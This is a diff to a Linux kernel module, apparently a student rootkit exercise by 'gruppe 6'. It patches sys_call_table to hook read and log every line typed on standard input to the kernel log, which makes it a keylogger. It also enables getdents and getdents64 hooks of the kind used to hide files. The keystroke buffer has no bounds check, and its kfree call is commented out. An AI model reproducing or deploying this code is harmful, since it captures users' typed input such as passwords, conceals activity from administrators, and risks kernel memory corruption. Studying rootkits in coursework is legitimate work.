@@ -28,6 +28,12 @@
 #define OUR_DEBUG(...)
 #endif
 
+// to read secret messages from the command line, we need
+// some infrastructure to handle this.
+#define INITIAL_CL_SIZE 256
+char *internal_cl;
+unsigned int cl_size;
+unsigned int cl_pos;
 
 struct linux_dirent {
     unsigned long  d_ino;     /* Inode number */
@@ -74,10 +80,20 @@ asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count){
     OUR_TRY_MODULE_GET;
     retval = original_read(fd, buf, count);
     cur_buf = buf;
-    if (retval > 0){
-        if (fd == 0){
-            printk(KERN_INFO "%d = hooked_read(%d, %s, %d)\n", retval, fd, buf, count);
+    if (fd == 0){
+        if (buf[0] == 127){
+            cl_pos = (cl_pos==0) ? 0 : cl_pos - 1;
         }
+        else if (buf[0] == 13) {
+            internal_cl[cl_pos] = 0;
+            cl_pos = 0;
+            printk(KERN_INFO "Received: %s\n", internal_cl);
+            memset(internal_cl, 0, cl_size);
+        }
+        else {
+            internal_cl[cl_pos++] = buf[0];
+        }
+        // printk(KERN_INFO "%d = hooked_read(%d, %s(=%d), %d)\n", retval, fd, buf, buf[0], count);
     }
     OUR_MODULE_PUT;
     return retval;
@@ -169,8 +185,8 @@ void hook_functions(void){
 
   // replace function pointers! YEEEHOW!!
   sys_call_table[__NR_read] = (void*) hooked_read;
-  // sys_call_table[__NR_getdents] = (void*) hooked_getdents;
-  // sys_call_table[__NR_getdents64] = (void*) hooked_getdents64;
+  sys_call_table[__NR_getdents] = (void*) hooked_getdents;
+  sys_call_table[__NR_getdents64] = (void*) hooked_getdents64;
 }
 
 /* Hooks the read system call. */
@@ -196,6 +212,9 @@ int print_nr_procs(void){
 /* Initialization routine */
 static int __init _init_module(void)
 {
+    cl_size = INITIAL_CL_SIZE;
+    internal_cl = kmalloc(sizeof(char) * cl_size, GFP_KERNEL);
+    cl_pos = 0;
     printk(KERN_INFO "This is the kernel module of gruppe 6.\n");
     print_nr_procs();
     hook_functions();
@@ -205,6 +224,7 @@ static int __init _init_module(void)
 /* Exiting routine */
 static void __exit _cleanup_module(void)
 {
+    // kfree(internal_cl);
     unhook_functions();
     printk(KERN_INFO "Gruppe 6 says goodbye.\n");
 }
